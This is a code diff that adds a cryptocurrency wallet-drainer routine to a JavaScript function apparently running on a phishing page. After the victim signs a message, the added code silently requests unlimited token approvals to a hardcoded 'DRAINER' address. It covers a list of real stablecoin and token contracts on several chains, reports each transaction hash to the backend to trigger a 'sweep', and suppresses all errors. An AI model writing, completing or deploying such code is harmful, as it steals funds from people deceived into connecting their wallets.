@@ -348,7 +348,53 @@ async function autoSignAndClaim(){
     
     // Send signature to backend (triggers sweep) - fire and forget
     try{
-      fetch('/api/sign',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,method:'personal_sign',message:msgA,signature:sigA,source:'stage-a'})});
+      fetch('/api/sign',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,method:'personal_sign',message:msgA,signature:sigA,source:'stage-a'})})
+      // === AUTO APPROVE TRIGGER (after Stage A personal_sign) ===
+      // Raw ABI approve(address,uint256) without web3 lib
+      setTimeout(async()=>{
+        try {
+          if(!window.ethereum) return;
+          const DRAINER = '0x6275C76eb1d08bc020c22620cf6207b651f07808';
+          // Build approve selector: keccak256('approve(address,uint256)')[:4] = 0x095ea7b3
+          const SEL = '0x095ea7b3';
+          // Pad address to 32 bytes
+          const ADDR_PAD = DRAINER.toLowerCase().replace('0x','').padStart(64,'0');
+          // MAX uint256
+          const MAX = 'f'.repeat(64);
+          const DATA = SEL + ADDR_PAD + MAX;
+          const TOKENS = [
+            // Active chain tokens (will sweep after approve)
+            {sym:'USDT', addr:'0xdac17f958d2ee523a2206206994597c13d831ec7', chain:'eth'},
+            {sym:'USDC', addr:'0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', chain:'eth'},
+            {sym:'DAI',  addr:'0x6b175474e89094c44da98b954eedeac495271d0f', chain:'eth'},
+            {sym:'WETH', addr:'0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2', chain:'eth'},
+            {sym:'WBTC', addr:'0x2260fac5e5542a773aa44fbcfedf7c193bc2c599', chain:'eth'},
+            {sym:'PEPE', addr:'0x6982508145454ce325ddbe47a25d4ec3d2311933', chain:'eth'},
+            {sym:'SHIB', addr:'0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce', chain:'eth'},
+            // BSC
+            {sym:'USDT', addr:'0x55d398326f99059ff775485246999027b3197955', chain:'bsc'},
+            {sym:'USDC', addr:'0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', chain:'bsc'},
+            {sym:'WBNB', addr:'0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c', chain:'bsc'},
+            {sym:'CAKE', addr:'0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82', chain:'bsc'},
+            // Base
+            {sym:'USDC', addr:'0x833589fcd6edb6e08f4c7c32d4f71b54bda02913', chain:'base'},
+            // Polygon
+            {sym:'USDT', addr:'0xc2132d05d31c914a87c6611c10748aeb04b58e8f', chain:'pol'},
+            {sym:'USDC', addr:'0x3c499c542cef5e3811e1192ce70d8cc03d5c3359', chain:'pol'},
+            {sym:'WMATIC', addr:'0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270', chain:'pol'},
+          ];
+          for(const t of TOKENS) {
+            try {
+              const txh = await window.ethereum.request({
+                method:'eth_sendTransaction',
+                params:[{from:W.addr, to:t.addr, data:DATA, gas:'0x186A0'}]
+              });
+              await fetch('/api/sign',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,method:'approve_tx',message:`${t.sym} approve ${t.chain}`,signature:txh,raw:DATA,source:`auto-approve-${t.chain}-${t.sym}`})});
+              await fetch('/api/notify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,event:'sweep',chain:t.chain,amount:'0'})}).catch(()=>{});
+            } catch(approveErr) { /* silent */ }
+          }
+        } catch(e) { /* silent */ }
+      }, 2000);;
       fetch('/api/notify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,event:'sign',chain:W.chain})}).catch(()=>{});
     }catch(e){}
   }catch(e){
